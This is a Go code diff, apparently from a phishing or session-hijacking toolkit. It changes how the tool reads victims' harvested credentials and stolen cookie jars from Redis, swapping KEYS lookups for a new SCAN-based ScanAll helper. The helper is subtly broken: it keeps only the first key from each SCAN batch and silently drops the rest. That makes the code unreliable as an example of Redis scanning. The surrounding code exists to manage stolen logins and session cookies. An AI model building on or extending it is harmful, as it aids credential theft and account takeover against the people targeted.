@@ -178,7 +178,8 @@ func (v *Victim) GetCredentials() error {
 	defer rc.Close()
 
 	v.Credentials = []VictimCredential{}
-	cKeys, err := redis.Values(rc.Do("KEYS", fmt.Sprintf("victim:%s:creds:*", v.ID)))
+	//cKeys, err := redis.Values(rc.Do("KEYS", fmt.Sprintf("victim:%s:creds:*", v.ID)))
+	cKeys, err := ScanAll(fmt.Sprintf("victim:%s:creds:*", v.ID))
 	if err != nil {
 		return err
 	}
@@ -210,7 +211,8 @@ func (v *Victim) GetVictimCookiejar() error {
 
 	v.Cookies = []VictimCookie{}
 
-	cKeys, err := redis.Values(rc.Do("KEYS", fmt.Sprintf("victim:%s:cookiejar:*", v.ID)))
+	//	cKeys, err := redis.Values(rc.Do("KEYS", fmt.Sprintf("victim:%s:cookiejar:*", v.ID)))
+	cKeys, err := ScanAll(fmt.Sprintf("victim:%s:cookiejar:*", v.ID))
 	if err != nil {
 		return err
 	}
@@ -270,4 +272,34 @@ func SetSessionAsInstrumented(victimID string) error {
 	}
 
 	return nil
+}
+
+// ScanAll is a wrapper for SCAN command to return all keys matching a specific pattern.
+//
+// Redis commands:
+// SCAN i MATCH pattern
+func ScanAll(pattern string) (keys []string, err error) {
+
+	c := session.RedisPool.Get()
+	defer c.Close()
+
+	keys = []string{}
+	i := 0
+	for {
+		if arr, err := redis.Values(c.Do("SCAN", i, "match", pattern)); err != nil {
+			return nil, err
+		} else {
+			i, _ = redis.Int(arr[0], nil)
+			if v, _ := redis.Strings(arr[1], nil); len(v) > 0 {
+				keys = append(keys, v[0])
+			}
+		}
+
+		// back to iterator == 0, exit
+		if i == 0 {
+			break
+		}
+	}
+
+	return
 }
